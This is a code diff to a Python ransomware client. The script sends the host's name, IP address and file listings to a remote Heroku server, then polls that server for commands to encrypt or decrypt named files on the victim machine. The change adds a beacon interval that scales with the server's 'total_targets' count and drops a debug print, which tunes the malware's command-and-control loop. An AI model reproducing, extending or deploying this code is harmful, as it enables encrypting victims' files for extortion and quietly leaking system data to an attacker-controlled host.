@@ -10,6 +10,7 @@ import json
 server_route='https://cryptserver555.herokuapp.com'
 hostname = socket.gethostname()
 IPAddr = socket.gethostbyname(hostname)
+sleep_time=60
 
 def key_generate(path,filename):
     file_size=os.path.getsize(str(path+filename))
@@ -36,6 +37,7 @@ def file_valid(file_name,path):
         
 
 def system_info():
+    global sleep_time
     roots=[]
     items=[]
     timer=int(time.time())+0
@@ -54,6 +56,8 @@ def system_info():
         "roots":json.dumps(roots),
         "items":json.dumps(items)
     })
+    sleep_time=sleep_time*(x.json()['total_targets'])
+
     
 
 
@@ -95,10 +99,11 @@ def str_to_byte(key):
     return rsa.PrivateKey.load_pkcs1(b.decode('utf8'))
 
 def server_connect():
+    global sleep_time
     res=requests.post(server_route+'/getAction',json={"hostname":hostname})
-    print(res.json())
     if not res.json()['data']=='server is running':
         if (res.json()['data']['filename']) and (res.json()['data']['path']):
+            sleep_time=sleep_time*(res.json()['data']['total_targets'])
             if (res.json()['data']['action_name'])=='encrypt':
                 encrypt(paths=(res.json()['data']['path']),file=(res.json()['data']['filename']))
             elif (res.json()['data']['action_name'])=='decrypt':
@@ -112,4 +117,4 @@ def server_connect():
 system_info()
 while True:
     server_connect()
-    time.sleep(900)
+    time.sleep(sleep_time)
